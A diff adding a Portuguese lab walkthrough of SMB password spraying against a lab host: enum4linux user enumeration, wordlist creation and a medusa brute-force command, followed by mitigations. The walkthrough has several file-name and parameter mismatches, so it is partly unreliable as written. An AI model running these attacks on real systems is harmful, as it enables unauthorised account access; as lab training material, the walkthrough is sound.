@@ -168,6 +168,71 @@ testando os dados obtidos
 
 Demonstrar a técnica de password spraying contra o serviço SMB/Windows (tentar poucas senhas comuns contra muitos usuários para evitar bloqueios).
 
+Enumerando o usuarios com enum4linux 
+
+```bash
+enum4linux -a 192.168.56.103 | tee enum4_output.txt
+```
+
+Parametros
+
+-a vai ativar todas as tenicas possiveis
+
+tee grava a saida em arquivo
+
+
+criar os arquivos de wordlist smb_users.txt e senhas_spray.txt
+
+Users
+```bash
+echo -e "user\nmsfadmin\nservice" > smb_users.txt
+```
+
+senhas
+
+```bash
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+```
+![smb user e senha](imagens/senhas_smb.PNG)
+
+
+
+
+executando o ataque
+
+```bash
+medusa -h 192.168.56.103 -U users_smb.txt -P spray_pass.txt -M smb -T 4
+```
+
+Parâmetros
+
+-h destino
+-U lista de usuarios
+-P lista de senhas
+-M smbnt modulo para smb
+-t 2 duas treads
+-T 50 ate 50 hosts paralelos
+
+![smb](imagens/dadossmb.PNG)
+
+
+
+
+### Como mitigar esses ataques
+
+* Desativar serviços desnecessarios
+* Utilize sftp scp
+* Utilize senhas fortes
+* Politicas de bloqueios por numeros de tentativas
+* Manter sempre atualizados e validados
+* Autenticação multifator
+* Auditorias periodicas
+* Monitorar e alertar
+* Monitoramento inteligente de logs
+* Segmentação de rede
+* Qualquer tentativa de multiplos logins deve ser alertado
+* Prevenção e conciencia tecnica
+
 
 
 
